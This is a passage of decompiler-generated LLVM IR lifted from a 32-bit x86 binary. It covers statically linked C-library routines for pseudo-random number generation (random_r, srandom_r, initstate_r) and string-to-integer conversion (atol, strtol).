  %v2_805138a = add i32 %v1_8051381, ptrtoint (i32* @global_var_8057f60.216 to i32)
  %v3_805138a = inttoptr i32 %v2_805138a to i32*
  %v4_805138a = load i32, i32* %v3_805138a, align 4
  store i32 %v4_805138a, i32* %ebp.global-to-local, align 4
  %v1_8051391 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051391 = add i32 %v1_8051391, 12
  %v3_8051391 = inttoptr i32 %v2_8051391 to i32*
  store i32 %v11_805137a, i32* %v3_8051391, align 4
  %v0_8051394 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051394 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051394 = add i32 %v1_8051394, 16
  %v3_8051394 = inttoptr i32 %v2_8051394 to i32*
  store i32 %v0_8051394, i32* %v3_8051394, align 4
  %v0_8051397 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8051397 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051397 = add i32 %v1_8051397, 20
  %v3_8051397 = inttoptr i32 %v2_8051397 to i32*
  store i32 %v0_8051397, i32* %v3_8051397, align 4
  br i1 %v1_8051388, label %dec_label_pc_80513b2, label %dec_label_pc_805139c

dec_label_pc_805139c:                             ; preds = %dec_label_pc_8051381
  %v0_805139c = load i32, i32* %esi.global-to-local, align 4
  %v1_805139c = add i32 %v0_805139c, -4
  %v2_805139c = inttoptr i32 %v1_805139c to i32*
  %v3_805139c = load i32, i32* %v2_805139c, align 4
  %v1_805139f = ashr i32 %v3_805139c, 31
  %v0_80513a0 = load i32, i32* %edi.global-to-local, align 4
  %v2_80513a0 = zext i32 %v3_805139c to i64
  %v4_80513a0 = zext i32 %v1_805139f to i64
  %v5_80513a0 = mul nuw i64 %v4_80513a0, 4294967296
  %v6_80513a0 = or i64 %v5_80513a0, %v2_80513a0
  %v7_80513a0 = zext i32 %v0_80513a0 to i64
  %v8_80513a0 = sdiv i64 %v6_80513a0, %v7_80513a0
  %v9_80513a0 = trunc i64 %v8_80513a0 to i32
  %v2_80513a2 = mul i32 %v9_80513a0, 4
  %v3_80513a2 = add i32 %v2_80513a2, %v0_805139c
  %v1_80513a5 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80513a5 = add i32 %v1_80513a5, %v9_80513a0
  store i32 %v2_80513a5, i32* %eax.global-to-local, align 4
  %v1_80513a7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80513a7 = add i32 %v1_80513a7, 4
  %v3_80513a7 = inttoptr i32 %v2_80513a7 to i32*
  store i32 %v3_80513a2, i32* %v3_80513a7, align 4
  %v0_80513aa = load i32, i32* %eax.global-to-local, align 4
  %v1_80513aa = ashr i32 %v0_80513aa, 31
  %v0_80513ab = load i32, i32* %ecx.global-to-local, align 4
  %v2_80513ab = zext i32 %v0_80513aa to i64
  %v4_80513ab = zext i32 %v1_80513aa to i64
  %v5_80513ab = mul nuw i64 %v4_80513ab, 4294967296
  %v6_80513ab = or i64 %v5_80513ab, %v2_80513ab
  %v7_80513ab = zext i32 %v0_80513ab to i64
  %v8_80513ab = sdiv i64 %v6_80513ab, %v7_80513ab
  %v9_80513ab = trunc i64 %v8_80513ab to i32
  store i32 %v9_80513ab, i32* %eax.global-to-local, align 4
  %v10_80513ab = srem i64 %v6_80513ab, %v7_80513ab
  %v11_80513ab = trunc i64 %v10_80513ab to i32
  %v0_80513ad = load i32, i32* %esi.global-to-local, align 4
  %v2_80513ad = mul i32 %v11_80513ab, 4
  %v3_80513ad = add i32 %v2_80513ad, %v0_80513ad
  %v1_80513b0 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80513b0 = inttoptr i32 %v1_80513b0 to i32*
  store i32 %v3_80513ad, i32* %v2_80513b0, align 4
  br label %dec_label_pc_80513b2

dec_label_pc_80513b2:                             ; preds = %dec_label_pc_8051381, %dec_label_pc_805139c
  %v0_80513b2 = load i32, i32* %esi.global-to-local, align 4
  %v1_80513b2 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80513b2 = mul i32 %v1_80513b2, 4
  %v3_80513b2 = add i32 %v2_80513b2, %v0_80513b2
  %v1_80513b5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80513b5 = add i32 %v1_80513b5, 24
  %v3_80513b5 = inttoptr i32 %v2_80513b5 to i32*
  store i32 %v3_80513b2, i32* %v3_80513b5, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_80513ba = load i32, i32* %esi.global-to-local, align 4
  %v1_80513ba = load i32, i32* %ebx.global-to-local, align 4
  %v2_80513ba = add i32 %v1_80513ba, 8
  %v3_80513ba = inttoptr i32 %v2_80513ba to i32*
  store i32 %v0_80513ba, i32* %v3_80513ba, align 4
  %v0_80513d4.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80513cd

dec_label_pc_80513bf:                             ; preds = %dec_label_pc_8051371
  %v1_80513bf = call i32 @__errno_location(i32 %v0_805133f)
  %v1_80513c4 = inttoptr i32 %v1_80513bf to i32*
  store i32 22, i32* %v1_80513c4, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80513cd

dec_label_pc_80513cd:                             ; preds = %dec_label_pc_80513b2, %dec_label_pc_80513bf
  %v0_80513d4 = phi i32 [ %v0_80513d4.pre, %dec_label_pc_80513b2 ], [ -1, %dec_label_pc_80513bf ]
  store i32 %v0_805133f, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80513d4

; uselistorder directives
  uselistorder i32 %v11_805137a, { 1, 3, 2, 0 }
  uselistorder i32 %tmp3, { 0, 1, 3, 2 }
  uselistorder i64 5, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80513cd, { 1, 0 }
  uselistorder label %dec_label_pc_80513b2, { 1, 0 }
  uselistorder label %dec_label_pc_8051371, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_80513d8 = load i32, i32* @ebx, align 4
  store i32 %v0_80513d8, i32* %stack_var_-16, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_80513e1 = add i32 %tmp3, 12
  %v2_80513e1 = inttoptr i32 %v1_80513e1 to i32*
  %v3_80513e1 = load i32, i32* %v2_80513e1, align 4
  %v4_80513e1 = icmp eq i32 %v3_80513e1, 0
  %v1_80513e5 = add i32 %tmp3, 8
  %v2_80513e5 = inttoptr i32 %v1_80513e5 to i32*
  %v3_80513e5 = load i32, i32* %v2_80513e5, align 4
  store i32 %v3_80513e5, i32* %esi.global-to-local, align 4
  %v1_80513e8 = icmp eq i1 %v4_80513e1, false
  br i1 %v1_80513e8, label %dec_label_pc_8051401, label %dec_label_pc_80513ea

dec_label_pc_80513ea:                             ; preds = %entry
  %v2_80513ea = inttoptr i32 %v3_80513e5 to i32*
  %v3_80513ea = load i32, i32* %v2_80513ea, align 4
  %v5_80513ea = mul i32 %v3_80513ea, 1103515245
  %v1_80513f0 = add i32 %v5_80513ea, 12345
  %v1_80513f5 = urem i32 %v1_80513f0, -2147483648
  store i32 %v1_80513f5, i32* %eax.global-to-local, align 4
  store i32 %v1_80513f5, i32* %v2_80513ea, align 4
  %v0_80513fc = load i32, i32* %eax.global-to-local, align 4
  %v1_80513fc = load i32, i32* %ebp.global-to-local, align 4
  %v2_80513fc = inttoptr i32 %v1_80513fc to i32*
  store i32 %v0_80513fc, i32* %v2_80513fc, align 4
  br label %dec_label_pc_805142c

dec_label_pc_8051401:                             ; preds = %entry
  %v1_8051401 = add i32 %tmp3, 4
  %v2_8051401 = inttoptr i32 %v1_8051401 to i32*
  %v3_8051401 = load i32, i32* %v2_8051401, align 4
  store i32 %v3_8051401, i32* %ecx.global-to-local, align 4
  %v2_8051404 = load i32, i32* %arg1, align 4
  store i32 %v2_8051404, i32* %edx.global-to-local, align 4
  %v1_8051406 = add i32 %tmp3, 24
  %v2_8051406 = inttoptr i32 %v1_8051406 to i32*
  %v3_8051406 = load i32, i32* %v2_8051406, align 4
  store i32 %v3_8051406, i32* %edi.global-to-local, align 4
  %v1_8051409 = inttoptr i32 %v3_8051401 to i32*
  %v2_8051409 = load i32, i32* %v1_8051409, align 4
  store i32 %v2_8051409, i32* %eax.global-to-local, align 4
  %v1_805140b = inttoptr i32 %v2_8051404 to i32*
  %v2_805140b = load i32, i32* %v1_805140b, align 4
  %v4_805140b = add i32 %v2_805140b, %v2_8051409
  store i32 %v4_805140b, i32* %v1_805140b, align 4
  %v0_805140d = load i32, i32* %edx.global-to-local, align 4
  %v1_805140d = inttoptr i32 %v0_805140d to i32*
  %v2_805140d = load i32, i32* %v1_805140d, align 4
  %v1_805140f = add i32 %v0_805140d, 4
  store i32 %v1_805140f, i32* %edx.global-to-local, align 4
  %v2_8051412 = udiv i32 %v2_805140d, 2
  %v1_8051414 = load i32, i32* %edi.global-to-local, align 4
  %v7_8051414 = icmp ult i32 %v1_805140f, %v1_8051414
  %v1_8051416 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8051416 = inttoptr i32 %v1_8051416 to i32*
  store i32 %v2_8051412, i32* %v2_8051416, align 4
  %v0_8051419 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051419 = add i32 %v0_8051419, 4
  store i32 %v1_8051419, i32* %eax.global-to-local, align 4
  br i1 %v7_8051414, label %dec_label_pc_8051422, label %dec_label_pc_805141e

dec_label_pc_805141e:                             ; preds = %dec_label_pc_8051401
  %v0_805141e = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_805141e, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051427

dec_label_pc_8051422:                             ; preds = %dec_label_pc_8051401
  %v1_8051422 = load i32, i32* %edi.global-to-local, align 4
  %v7_8051422 = icmp ult i32 %v1_8051419, %v1_8051422
  %v1_8051424 = icmp eq i1 %v7_8051422, false
  %v3_8051424 = load i32, i32* %esi.global-to-local, align 4
  %v4_8051424 = select i1 %v1_8051424, i32 %v3_8051424, i32 %v1_8051419
  store i32 %v4_8051424, i32* %eax.global-to-local, align 4
  %v0_8051427.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051427

dec_label_pc_8051427:                             ; preds = %dec_label_pc_805141e, %dec_label_pc_8051422
  %v0_8051427 = phi i32 [ %v0_805141e, %dec_label_pc_805141e ], [ %v0_8051427.pre, %dec_label_pc_8051422 ]
  %v1_8051427 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051427 = inttoptr i32 %v1_8051427 to i32*
  store i32 %v0_8051427, i32* %v2_8051427, align 4
  %v0_8051429 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051429 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051429 = add i32 %v1_8051429, 4
  %v3_8051429 = inttoptr i32 %v2_8051429 to i32*
  store i32 %v0_8051429, i32* %v3_8051429, align 4
  br label %dec_label_pc_805142c

dec_label_pc_805142c:                             ; preds = %dec_label_pc_80513ea, %dec_label_pc_8051427
  %v2_805142c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805142c, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_80513f5, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_805142c, { 1, 0 }
  uselistorder label %dec_label_pc_8051427, { 1, 0 }
}

define i32 @srandom_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp14 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i64, align 8
  %v0_8051433 = load i32, i32* @ebp, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8051437 = load i32, i32* @edi, align 4
  %v0_8051438 = load i32, i32* @esi, align 4
  %v0_8051439 = load i32, i32* @ebx, align 4
  store i32 %tmp14, i32* @esi, align 4
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v1_8051445 = add i32 %tmp14, 12
  %v2_8051445 = inttoptr i32 %v1_8051445 to i32*
  %v3_8051445 = load i32, i32* %v2_8051445, align 4
  store i32 %v3_8051445, i32* %ecx.global-to-local, align 4
  %v6_805144b = icmp ugt i32 %v3_8051445, 4
  br i1 %v6_805144b, label %dec_label_pc_80514c5, label %dec_label_pc_805144d

dec_label_pc_805144d:                             ; preds = %entry
  %v1_805144d = add i32 %tmp14, 8
  %v2_805144d = inttoptr i32 %v1_805144d to i32*
  %v3_805144d = load i32, i32* %v2_805144d, align 4
  store i32 %v3_805144d, i32* %ebx.global-to-local, align 4
  %v1_8051450 = icmp eq i32 %arg1, 0
  store i32 1, i32* %eax.global-to-local, align 4
  %v3_8051457 = select i1 %v1_8051450, i32 1, i32 %arg1
  store i32 %v3_8051457, i32* %edx.global-to-local, align 4
  %v1_805145a = icmp eq i32 %v3_8051445, 0
  %v2_805145c = inttoptr i32 %v3_805144d to i32*
  store i32 %v3_8051457, i32* %v2_805145c, align 4
  br i1 %v1_805145a, label %dec_label_pc_80514c3, label %dec_label_pc_8051460

dec_label_pc_8051460:                             ; preds = %dec_label_pc_805144d
  %v0_8051460 = load i32, i32* @esi, align 4
  %v1_8051460 = add i32 %v0_8051460, 16
  %v2_8051460 = inttoptr i32 %v1_8051460 to i32*
  %v3_8051460 = load i32, i32* %v2_8051460, align 4
  store i32 %v3_8051460, i32* %eax.global-to-local, align 4
  %v0_8051463 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8051463, i32* %ecx.global-to-local, align 4
  store i32 1, i32* @edi, align 4
  %v4_805146a = sext i32 %v3_8051460 to i64
  store i64 %v4_805146a, i64* %stack_var_-40, align 8
  %v5_80514a032 = icmp sgt i32 %v3_8051460, 1
  br i1 %v5_80514a032, label %dec_label_pc_805146f, label %dec_label_pc_80514a2

dec_label_pc_805146f:                             ; preds = %dec_label_pc_8051460, %dec_label_pc_805146f.dec_label_pc_805146f_crit_edge
  %v0_8051497 = phi i32 [ %v0_8051497.pre, %dec_label_pc_805146f.dec_label_pc_805146f_crit_edge ], [ %v0_8051463, %dec_label_pc_8051460 ]
  %v0_805146f = load i32, i32* %edx.global-to-local, align 4
  %v1_8051476 = ashr i32 %v0_805146f, 31
  %v2_8051477 = zext i32 %v0_805146f to i64
  %v4_8051477 = zext i32 %v1_8051476 to i64
  %v5_8051477 = mul nuw i64 %v4_8051477, 4294967296
  %v6_8051477 = or i64 %v5_8051477, %v2_8051477
  %v8_8051477 = sdiv i64 %v6_8051477, 127773
  %v9_8051477 = trunc i64 %v8_8051477 to i32
  %v10_8051477 = srem i64 %v6_8051477, 127773
  %v3_805147d = mul nsw i64 %v10_8051477, 16807
  %v4_805147d = trunc i64 %v3_805147d to i32
  %tmp24 = mul i32 %v9_8051477, -2836
  %v2_8051489 = add i32 %v4_805147d, %tmp24
  %v1_805148b = add i32 %v2_8051489, 1
  %v6_805148b = xor i32 %v2_8051489, -2147483648
  %v7_805148b = xor i32 %v1_805148b, %v2_8051489
  %v8_805148b = and i32 %v7_805148b, %v6_805148b
  %v9_805148b = icmp slt i32 %v8_805148b, 0
  %v10_805148b = icmp eq i32 %v1_805148b, 0
  %v11_805148b = icmp slt i32 %v1_805148b, 0
  %v1_805148e = add i32 %v2_8051489, 2147483647
  store i32 %v1_805148e, i32* %eax.global-to-local, align 4
  %v3_8051494 = icmp ne i1 %v11_805148b, %v9_805148b
  %v4_8051494 = or i1 %v10_805148b, %v3_8051494
  %v7_8051494 = select i1 %v4_8051494, i32 %v1_805148e, i32 %v2_8051489
  store i32 %v7_8051494, i32* %edx.global-to-local, align 4
  %v1_8051497 = add i32 %v0_8051497, 4
  store i32 %v1_8051497, i32* %ecx.global-to-local, align 4
  %v2_805149a = inttoptr i32 %v1_8051497 to i32*
  store i32 %v7_8051494, i32* %v2_805149a, align 4
  %v0_805149c = load i32, i32* @edi, align 4
  %v1_805149c = add i32 %v0_805149c, 1
  store i32 %v1_805149c, i32* @edi, align 4
  %v3_805149d.pre = load i64, i64* %stack_var_-40, align 8
  %extract.t11 = trunc i64 %v3_805149d.pre to i32
  %v5_80514a0 = icmp slt i32 %v1_805149c, %extract.t11
  br i1 %v5_80514a0, label %dec_label_pc_805146f.dec_label_pc_805146f_crit_edge, label %dec_label_pc_805149d.dec_label_pc_80514a2_crit_edge

dec_label_pc_805146f.dec_label_pc_805146f_crit_edge: ; preds = %dec_label_pc_805146f
  %v0_8051497.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805146f

dec_label_pc_805149d.dec_label_pc_80514a2_crit_edge: ; preds = %dec_label_pc_805146f
  %v0_80514a2.pre = load i32, i32* @esi, align 4
  %v0_80514a5.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80514a2

dec_label_pc_80514a2:                             ; preds = %dec_label_pc_805149d.dec_label_pc_80514a2_crit_edge, %dec_label_pc_8051460
  %v0_80514a5 = phi i32 [ %v0_80514a5.pre, %dec_label_pc_805149d.dec_label_pc_80514a2_crit_edge ], [ %v0_8051463, %dec_label_pc_8051460 ]
  %v0_80514a2 = phi i32 [ %v0_80514a2.pre, %dec_label_pc_805149d.dec_label_pc_80514a2_crit_edge ], [ %v0_8051460, %dec_label_pc_8051460 ]
  %v1_80514a2 = add i32 %v0_80514a2, 20
  %v2_80514a2 = inttoptr i32 %v1_80514a2 to i32*
  %v3_80514a2 = load i32, i32* %v2_80514a2, align 4
  store i32 %v3_80514a2, i32* %eax.global-to-local, align 4
  %v2_80514a5 = add i32 %v0_80514a2, 4
  %v3_80514a5 = inttoptr i32 %v2_80514a5 to i32*
  store i32 %v0_80514a5, i32* %v3_80514a5, align 4
  %v0_80514a8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80514a8 = load i32, i32* %eax.global-to-local, align 4
  %v2_80514a8 = mul i32 %v1_80514a8, 4
  %v3_80514a8 = add i32 %v2_80514a8, %v0_80514a8
  store i32 %v3_80514a8, i32* %eax.global-to-local, align 4
  %v1_80514ab = load i32, i32* @esi, align 4
  %v2_80514ab = inttoptr i32 %v1_80514ab to i32*
  store i32 %v3_80514a8, i32* %v2_80514ab, align 4
  %v3_80514ad = load i64, i64* %stack_var_-40, align 8
  %v6_80514ad = mul nsw i64 %v3_80514ad, 10
  %v7_80514ad = trunc i64 %v6_80514ad to i32
  %v2_80514b3 = ptrtoint i32* %stack_var_-20 to i32
  %v1_80514c025 = add i32 %v7_80514ad, -1
  %v9_80514c029 = icmp slt i32 %v1_80514c025, 0
  store i32 %v1_80514c025, i32* @ebx, align 4
  %v1_80514c130 = icmp eq i1 %v9_80514c029, false
  br i1 %v1_80514c130, label %dec_label_pc_80514b3, label %dec_label_pc_80514c3

dec_label_pc_80514b3:                             ; preds = %dec_label_pc_80514a2, %dec_label_pc_80514b3
  store i32 %v2_80514b3, i32* %eax.global-to-local, align 4
  %v0_80514b8 = load i32, i32* @esi, align 4
  %v2_80514b9 = inttoptr i32 %v0_80514b8 to i32*
  %v3_80514b9 = call i32 @__GI_random_r(i32* %v2_80514b9, i32 %v2_80514b3)
  store i32 %v0_80514b8, i32* %eax.global-to-local, align 4
  store i32 %v2_80514b3, i32* %edx.global-to-local, align 4
  %v0_80514c0.pre = load i32, i32* @ebx, align 4
  %v1_80514c0 = add i32 %v0_80514c0.pre, -1
  %v9_80514c0 = icmp slt i32 %v1_80514c0, 0
  store i32 %v1_80514c0, i32* @ebx, align 4
  %v1_80514c1 = icmp eq i1 %v9_80514c0, false
  br i1 %v1_80514c1, label %dec_label_pc_80514b3, label %dec_label_pc_80514c3

dec_label_pc_80514c3:                             ; preds = %dec_label_pc_80514a2, %dec_label_pc_80514b3, %dec_label_pc_805144d
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80514c5

dec_label_pc_80514c5:                             ; preds = %entry, %dec_label_pc_80514c3
  %v0_80514cc = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_80514c3 ]
  store i32 %v0_8051439, i32* @ebx, align 4
  store i32 %v0_8051438, i32* @esi, align 4
  store i32 %v0_8051437, i32* @edi, align 4
  store i32 %v0_8051433, i32* @ebp, align 4
  ret i32 %v0_80514cc

; uselistorder directives
  uselistorder i32 %v1_80514c0, { 1, 0 }
  uselistorder i32 %v0_80514a2, { 1, 0 }
  uselistorder i32 %v1_805148b, { 2, 1, 0 }
  uselistorder i32 %v2_8051489, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v0_8051463, { 1, 0, 2 }
  uselistorder i32 %v3_8051445, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 0, 1 }
  uselistorder i32 %tmp14, { 0, 2, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder label %dec_label_pc_80514c5, { 1, 0 }
  uselistorder label %dec_label_pc_80514c3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80514b3, { 1, 0 }
  uselistorder label %dec_label_pc_805146f, { 1, 0 }
}

define i32 @__GI_initstate_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %stack_var_-36 = alloca i32, align 4
  %v0_80514cf = load i32, i32* @esi, align 4
  %v0_80514d0 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp = icmp ult i32 %arg3, 128
  br i1 %tmp, label %dec_label_pc_80514f1, label %dec_label_pc_80514e5

dec_label_pc_80514e5:                             ; preds = %entry
  %v2_80514e5 = icmp ult i32 %arg3, 256
  %v1_80514ec = select i1 %v2_80514e5, i32 5, i32 4
  store i32 %v1_80514ec, i32* @ebx, align 4
  br label %dec_label_pc_8051507

dec_label_pc_80514f1:                             ; preds = %entry
  %v6_80514f4 = icmp ugt i32 %arg3, 31
  br i1 %v6_80514f4, label %dec_label_pc_80514ff, label %dec_label_pc_80514f6

dec_label_pc_80514f6:                             ; preds = %dec_label_pc_80514f1
  store i32 0, i32* @ebx, align 4
  %v6_80514fb = icmp ugt i32 %arg3, 7
  br i1 %v6_80514fb, label %dec_label_pc_8051507, label %dec_label_pc_8051557

dec_label_pc_80514ff:                             ; preds = %dec_label_pc_80514f1
  %v2_80514ff = icmp ult i32 %arg3, 64
  %v1_8051504 = select i1 %v2_80514ff, i32 3, i32 2
  store i32 %v1_8051504, i32* @ebx, align 4
  br label %dec_label_pc_8051507

dec_label_pc_8051507:                             ; preds = %dec_label_pc_80514f6, %dec_label_pc_80514e5, %dec_label_pc_80514ff
  %v0_8051511 = phi i32 [ 0, %dec_label_pc_80514f6 ], [ %v1_80514ec, %dec_label_pc_80514e5 ], [ %v1_8051504, %dec_label_pc_80514ff ]
  %v1_8051507 = mul nuw nsw i32 %v0_8051511, 4
  %v2_8051507 = add i32 %v1_8051507, ptrtoint (i32* @global_var_8057f74.215 to i32)
  %v3_8051507 = inttoptr i32 %v2_8051507 to i32*
  %v4_8051507 = load i32, i32* %v3_8051507, align 4
  store i32 %v4_8051507, i32* %eax.global-to-local, align 4
  %v1_805150e = add i32 %tmp7, 4
  store i32 %v1_805150e, i32* @esi, align 4
  %v2_8051511 = add i32 %v1_8051507, ptrtoint (i32* @global_var_8057f60.216 to i32)
  %v3_8051511 = inttoptr i32 %v2_8051511 to i32*
  %v4_8051511 = load i32, i32* %v3_8051511, align 4
  store i32 %v4_8051511, i32* %edx.global-to-local, align 4
  %v2_8051518 = add i32 %arg4, 12
  %v3_8051518 = inttoptr i32 %v2_8051518 to i32*
  store i32 %v0_8051511, i32* %v3_8051518, align 4
  %v0_805151b = load i32, i32* @esi, align 4
  %v1_805151b = load i32, i32* @edi, align 4
  %v2_805151b = add i32 %v1_805151b, 8
  %v3_805151b = inttoptr i32 %v2_805151b to i32*
  store i32 %v0_805151b, i32* %v3_805151b, align 4
  %v0_805151e = load i32, i32* %eax.global-to-local, align 4
  %v1_805151e = load i32, i32* @edi, align 4
  %v2_805151e = add i32 %v1_805151e, 16
  %v3_805151e = inttoptr i32 %v2_805151e to i32*
  store i32 %v0_805151e, i32* %v3_805151e, align 4
  %v0_8051521 = load i32, i32* @esi, align 4
  %v1_8051521 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051521 = mul i32 %v1_8051521, 4
  %v3_8051521 = add i32 %v2_8051521, %v0_8051521
  store i32 %v3_8051521, i32* %eax.global-to-local, align 4
  %v0_8051524 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051524 = load i32, i32* @edi, align 4
  %v2_8051524 = add i32 %v1_8051524, 20
  %v3_8051524 = inttoptr i32 %v2_8051524 to i32*
  store i32 %v0_8051524, i32* %v3_8051524, align 4
  %v0_8051527 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051527 = load i32, i32* @edi, align 4
  %v2_8051527 = add i32 %v1_8051527, 24
  %v3_8051527 = inttoptr i32 %v2_8051527 to i32*
  store i32 %v0_8051527, i32* %v3_8051527, align 4
  %v0_805152a = load i32, i32* @edi, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_805152f = inttoptr i32 %v0_805152a to i32*
  %v3_805152f = call i32 @srandom_r(i32 %arg1, i32* %v2_805152f)
  %v0_8051534 = load i32, i32* @ebp, align 4
  %v1_8051534 = inttoptr i32 %v0_8051534 to i32*
  store i32 0, i32* %v1_8051534, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_805153f = load i32, i32* @ebx, align 4
  %v1_805153f = icmp eq i32 %v0_805153f, 0
  br i1 %v1_805153f, label %dec_label_pc_8051570, label %dec_label_pc_8051543

dec_label_pc_8051543:                             ; preds = %dec_label_pc_8051507
  %v0_8051543 = load i32, i32* @edi, align 4
  %v1_8051543 = add i32 %v0_8051543, 4
  %v2_8051543 = inttoptr i32 %v1_8051543 to i32*
  %v3_8051543 = load i32, i32* %v2_8051543, align 4
  %v1_8051546 = load i32, i32* @esi, align 4
  %v2_8051546 = sub i32 %v3_8051543, %v1_8051546
  %v2_8051548 = sdiv i32 %v2_8051546, 4
  %v3_805154b = mul i32 %v2_8051548, 5
  %v2_805154e = add i32 %v3_805154b, %v0_805153f
  %v1_8051550 = load i32, i32* @ebp, align 4
  %v2_8051550 = inttoptr i32 %v1_8051550 to i32*
  store i32 %v2_805154e, i32* %v2_8051550, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051570

dec_label_pc_8051557:                             ; preds = %dec_label_pc_80514f6
  %v1_8051557 = call i32 @__errno_location(i32 %v0_80514d0)
  store i32 %v1_8051557, i32* %eax.global-to-local, align 4
  %v1_805155c = inttoptr i32 %v1_8051557 to i32*
  store i32 22, i32* %v1_805155c, align 4
  %v0_8051562 = load i32, i32* %stack_var_-36, align 4
  %v1_8051562 = call i32 @__errno_location(i32 %v0_8051562)
  %v1_8051567 = inttoptr i32 %v1_8051562 to i32*
  store i32 22, i32* %v1_8051567, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051570

dec_label_pc_8051570:                             ; preds = %dec_label_pc_8051507, %dec_label_pc_8051543, %dec_label_pc_8051557
  %v0_8051577 = phi i32 [ 0, %dec_label_pc_8051507 ], [ 0, %dec_label_pc_8051543 ], [ -1, %dec_label_pc_8051557 ]
  store i32 %v0_80514cf, i32* @esi, align 4
  ret i32 %v0_8051577

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051570, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051507, { 2, 0, 1 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  %v3_8051583 = call i32 @strtol(i32 %arg1, i32 0, i32 10)
  ret i32 %v3_8051583
}

define i32 @strtol(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_805159d = inttoptr i32 %arg1 to i8*
  %v5_805159d = call i32 @_stdlib_strto_l(i8* %v4_805159d, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_805159d
}

define i32 @_stdlib_strto_l(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80515ab = load i32, i32* @ebx, align 4
  store i32 %v0_80515ab, i32* %stack_var_-16, align 4
  %v4_80515af = ptrtoint i8* %arg1 to i32
  store i32 %v4_80515af, i32* @ecx, align 4
